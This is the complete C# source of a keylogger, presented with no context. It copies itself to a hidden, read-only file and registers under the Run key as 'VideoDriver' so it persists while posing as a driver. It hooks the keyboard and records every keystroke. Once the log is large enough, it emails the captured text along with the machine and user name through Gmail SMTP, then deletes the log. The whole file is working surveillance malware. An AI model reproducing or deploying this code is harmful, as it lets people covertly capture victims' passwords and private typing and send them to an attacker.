using System;
using System.Text;
using System.IO;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;

namespace abc
{
	class AppRun
	{
		string logged;
		string pathLog = "log.log"; // log file
		string pathInstall = "D:\\key.exe"; // path to install
		string regName = "VideoDriver"; // registry name
		int logsize = 0;
		string logSize = "1";
		string mailto = "mailto@gmail.com";

		string mailfrom = "mailfrom@gmail.com";
		string mailfrompassword = "password";
		string SMTPAddress = "smtp.gmail.com";
		int SMTPPort = 587;

		System.Windows.Forms.Timer timer1;
		SmtpClient smtp;
		MailMessage message;

		public AppRun()
		{
			Install();

			logged = "";
			logsize = int.Parse(logSize) * 512; // log will be sent when the file length is reached

			if (File.Exists(pathLog))
			{
				StreamReader r = new StreamReader(File.OpenRead(pathLog));
				logged = r.ReadLine();
				r.Close();
				r.Dispose();
			}
			// start hook and set event
			UserActivityHook hook = new UserActivityHook(false, true);

			hook.KeyPress += Hook_KeyPress;

			timer1 = new System.Windows.Forms.Timer();
			timer1.Interval = 15000;
			timer1.Tick += Timer1_Tick;
			timer1.Start();
		}

		private void Install()
		{
			if (Application.ExecutablePath.ToUpper() != pathInstall.ToUpper())
			{
				File.Copy(Application.ExecutablePath, pathInstall, true);
				File.SetAttributes(pathInstall, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);

				InstallReg();
				Process.Start(pathInstall);

				Application.Exit();
			}
			else
			{
				InstallReg();
			}
		}

		private void InstallReg()
		{
			RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			if (rkApp.GetValue(regName) == null)
			{
				rkApp.SetValue(regName, pathInstall);
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (logged.Length >= 50)
			{
				try {
					StreamWriter w = new StreamWriter(File.Open(pathLog, FileMode.OpenOrCreate, FileAccess.Write));
					w.Write(logged);
					w.Close();
					w.Dispose();
					File.SetAttributes(pathLog, FileAttributes.Hidden | FileAttributes.System);
				}
				catch { }
			}
			if (logged.Length >= logsize)
			{
				Sendmail();
			}
		}

		public void Sendmail()
		{
			string computer = Environment.MachineName + " - " + Environment.OSVersion + " - " + Environment.UserName;

			message = new MailMessage(mailfrom, mailto, computer, logged);
			message.BodyEncoding = Encoding.UTF8;

			smtp = new SmtpClient(SMTPAddress, SMTPPort);
			smtp.UseDefaultCredentials = false;
			smtp.EnableSsl = true;
			smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtp.Credentials = new NetworkCredential(mailfrom, mailfrompassword);
			smtp.Send(message);
			logged = "";
			File.Delete(pathLog);
		}

		private void Hook_KeyPress(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Back)
			{
				logged += (char)e.KeyValue;
			}
			else
				logged += "{Backspace}";
			e.Handled = false;
		}
	}
}
